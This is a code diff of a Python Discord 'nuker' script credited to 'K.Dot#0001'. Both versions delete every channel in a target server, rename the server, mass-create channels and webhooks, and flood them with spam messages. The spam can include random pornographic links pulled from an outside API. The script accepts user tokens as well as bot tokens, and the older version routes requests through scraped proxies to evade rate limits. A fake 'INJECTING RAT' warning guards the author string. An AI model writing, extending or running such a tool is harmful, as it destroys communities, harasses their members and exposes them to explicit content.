@@ -1,4 +1,3 @@
-from util.proxies import proxy_scrape, proxy
 import os
 import random
 import time
@@ -7,19 +6,8 @@ import aiohttp
 from pystyle import Colors, Center, Colorate
 import sys
 import json
-import threading
-import urllib3
 
 __author__ = 'K.Dot#0001'
-
-with open('config.json', 'r') as f:
-    config = json.load(f)
-    TOKEN = config["TOKEN"]
-    MESSAGE = config["MESSAGE"]
-    AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
-    SPAM_PRN = config["SPAM_PRN"]
-    PROXIES = config["PROXIES"]
-    MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
 
 banner = Center.XCenter("""
  ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
@@ -31,110 +19,140 @@ banner = Center.XCenter("""
  Made by Godfather and K.Dot#0001\n\n
 """)
 
-all_choices = f"""
-Token = {TOKEN}
-Message = {MESSAGE}
-Ammount of channels = {AMMOUNT_OF_CHANNELS}
-Spam PRN = {SPAM_PRN}
-Proxies = {PROXIES}
-Messages per channel = {MESSAGES_PER_CHANNEL}
-"""
+print(Colorate.Vertical(Colors.yellow_to_red, banner, 2)) # print the banner
 
-print(Colorate.Vertical(Colors.yellow_to_red, banner, 2))
+class main: # main class
 
-print(Colorate.Color(Colors.green, all_choices, False))
+    def __init__(self) -> None: # init function cause cool
 
+        with open('config.json', 'r') as f:
+            config = json.load(f)
+            self.TOKEN = config["TOKEN"]
+            self.MESSAGE = config["MESSAGE"]
+            self.AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
+            self.SPAM_PRN = config["SPAM_PRN"]
+            self.MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
+            self.SERVER_NAME = config["SERVER_NAME"]
+            self.CHANNEL_NAMES = config["CHANNEL_NAMES"]
+            self.REST_TIME = config["REST_TIME"]
 
-api = "https://discord.com/api/v9"
-nwords = None
-bot_or_person = input("Is this a bot token or a person token? (bot/person) ")
-
-if bot_or_person == "bot":
-    token = TOKEN
-    nwords = {"Authorization": f"Bot {token}"}
-    
-elif bot_or_person == "person":
-    token = TOKEN
-    nwords = {"Authorization": f"{token}"}
-
-else:
-    print("Invalid option!")
-    sys.exit()
-
-guild = input("What is the guild id of the server you are nuking? -> ")
-async def main():
-    async with aiohttp.ClientSession() as kdot:
-        async with kdot.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
-            if r.status == 200:
-                print("Token is valid!")
-            else:
-                print("Token is invalid!")
-                sys.exit()
-        async with kdot.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
-            channel_id = await r.json()
-            async with kdot.get(headers = nwords, url = f'{api}/guilds/{guild}/channels') as f:
-                channel_id = await f.json()
-                for channel in channel_id:
-                    await kdot.delete(f'{api}/channels/{channel["id"]}', headers=nwords)
-        for i in range(int(AMMOUNT_OF_CHANNELS)):
-            channel = await kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": "nuked by k.dot", "type": 0})
-            data_channel = await channel.json()
-            channel_id = data_channel["id"]
-            try:
-                async with kdot.post(f'{api}/channels/{channel_id}/webhooks', headers=nwords, json={"name": "K.Dot#0001"}) as r:
-                    webhook_raw = await r.json()
-                    webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
-                    threading.Thread(target=spamhook, args=(webhook,)).start()
-            except:
-                print('U ratelimited af :skull:')
-
-def spamhookp(hook):
-    for i in range(MESSAGES_PER_CHANNEL):
-        http = urllib3.PoolManager()
-        if SPAM_PRN == True:
-            try:
-                with open('random.txt') as f:
-                    lines = f.readlines()
-                    random_int = random.randint(0,len(lines)-1)
-                    ran = lines[random_int]
-                http.request('POST', hook, fields={'content': f"{MESSAGE} + {ran}"}, proxy_url=proxy())
-            except:
-                print(f'error spamming! {hook}')
-        else:
-            try:
-                http.request('POST', hook, fields={'content': MESSAGE}, proxy_url=proxy())
-            except:
-                print(f'error spamming! {hook}')
-    sys.exit()
-
+        self.api = "https://discord.com/api/v9" # our api url
         
-def spamhook(hook):
-    for i in range(MESSAGES_PER_CHANNEL):
-        http = urllib3.PoolManager()
-        if SPAM_PRN == True:
+        self.webhook_ammount = 3 # you can change this value if u want
+        self.MESSAGES_PER_CHANNEL = round(self.MESSAGES_PER_CHANNEL / self.webhook_ammount) # cool math that does webhook calc
+        
+        self.guild = input("What is the guild id of the server you are nuking? -> ") # guild id that u tryna nuke
+        if self.SPAM_PRN == True: # hehehehehehe
+            self.hentai = self.get_hentai()
+        
+        asyncio.run(self.main()) # run main function
+        
+        
+    async def main(self):
+        self.nwords = await self.get_header_nwords() # get our headers (bot or person)
+        nwords = self.nwords # do that cause im lazy
+        api = self.api # I hate using self all the time
+        guild = self.guild
+        if await self.check_admin() == False: # see if user is admin (buggy prolly)
+            print("You are not an admin of this server!")
+            time.sleep(5)
+            sys.exit()
+        async with aiohttp.ClientSession() as kdot: # make a session
+            await kdot.patch(f'{api}/guilds/{guild}', headers=nwords, json={"name": self.SERVER_NAME}) # change server name
+            async with kdot.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r: # get all channels
+                channel_id = await r.json() # get all channels
+                for channels in channel_id: # loop through all channels
+                    await kdot.delete(f'{api}/channels/{channels["id"]}', headers=nwords) # delete all channels
+
+
+            for i in range(int(self.AMMOUNT_OF_CHANNELS)): # loop through all channels for the number chosen
+                await asyncio.sleep(self.REST_TIME) # rest time so discord doesn't get on ur wewe
+                async with kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": str(self.CHANNEL_NAMES), "type": 0}) as r: # create channels
+                    data = await r.json() 
+                    try:
+                        channelid = data['id']
+                    except KeyError: # if discord ratelimits u
+                        print('U made too many channels and discord is ratelimiting you :skull:')
+                        break
+                    
+                for i in range(self.webhook_ammount): # loop through all webhooks
+                    async with kdot.post(f'{api}/channels/{channelid}/webhooks', headers=nwords, json={"name": str(self.CHANNEL_NAMES)}) as r: # create webhooks
+                        webhook_raw = await r.json() # get webhook
+                        try:
+                            hook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}' # webhook url
+                        except KeyError:
+                            print('Failed to create webhook. Too many created in the server :skull:') # if discord ratelimits u
+                            break
+                        if self.SPAM_PRN == True: #hehehehehehehehe
+                            asyncio.create_task(self.spamhook_hentai(hook, self.MESSAGE))
+                        else:
+                            asyncio.create_task(self.spamhook(hook, self.MESSAGE))
+                            
+        while True: # this waits for all the async tasks to finish before exiting (makes sure there is only 1 left which is the main task)
+            await asyncio.sleep(1)
+            if len(asyncio.all_tasks()) == 1:
+                break
+        print("Finished")
+        time.sleep(5)
+        sys.exit()
+
+
+    async def spamhook(self, hook, spam_message): # spam webhook function
+        MESSAGES_PER_CHANNEL = int(self.MESSAGES_PER_CHANNEL)
+        async with aiohttp.ClientSession() as kdot:
+            for i in range(MESSAGES_PER_CHANNEL):
+                await kdot.post(hook, json={'content': f"{spam_message}"})
+                
+    async def spamhook_hentai(self, hook, spam_message): # spam webhook function but wit hentai
+        MESSAGES_PER_CHANNEL = int(self.MESSAGES_PER_CHANNEL)
+        async with aiohttp.ClientSession() as kdot:
+            for i in range(MESSAGES_PER_CHANNEL):
+                random_hentai = random.choice(self.hentai)
+                await kdot.post(hook, json={'content': f"{spam_message} {random_hentai}"})
+                
+    async def get_hentai(self): # get hentai from api
+        url = 'https://sped.lol/api/random'
+        async with aiohttp.ClientSession() as kdot:
+            async with kdot.get(url) as r:
+                data = await r.text()
+                return data
+            
+    async def check_admin(self): # check if user is admin prolly works good
+        async with aiohttp.ClientSession() as kdot: # ngl idk what I was doing here but it prolly works
             try:
-                with open('random.txt') as f:
-                    lines = f.readlines()
-                    random_int = random.randint(0,len(lines)-1)
-                    ran = lines[random_int]
-                http.request('POST', hook, fields={'content': f"{MESSAGE} + {ran}"})
+                async with kdot.get(f"{self.api}/users/@me/guilds/{self.guild}/member", headers=self.nwords) as r:
+                    self.admin_num = 1099511627775
+                    data = await r.json()
+                    print(data)
+                    if data["roles"] == self.admin_num or data["roles"] == []:
+                        return True
+                    else:
+                        return False
             except:
-                print(f'error spamming! {hook}')
-        else:
-            try:
-                http.request('POST', hook, fields={'content': MESSAGE})
-            except:
-                print(f'error spamming! {hook}')
-    sys.exit()
+                return True
+
+    async def get_header_nwords(self): # get header
+        async with aiohttp.ClientSession() as kdot:
+            nwords = {"Authorization": f"Bot {self.TOKEN}"}
+            async with kdot.get(f"{self.api}/users/@me", headers=nwords) as r:
+                if r.status == 200:
+                    return nwords
+                else:
+                    nwords = {"Authorization": f"{self.TOKEN}"}
+                    async with kdot.get(f"{self.api}/users/@me/guilds", headers=nwords) as r:
+                        if r.status == 200:
+                            return nwords
+                        else:
+                            print("Invalid token")
+                            time.sleep(5)
+                            sys.exit()
 
 
-if PROXIES == True:
-    proxy_scrape()
-
-if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
+if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31': # naw
     print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
     time.sleep(5)
     os._exit(0)
 
-if __name__ == '__main__':
-    asyncio.run(main())
+
+if __name__ == '__main__': # pretty sure this isn't helping since there is no "main function" but idk it makes everything look nicer
+    main() 
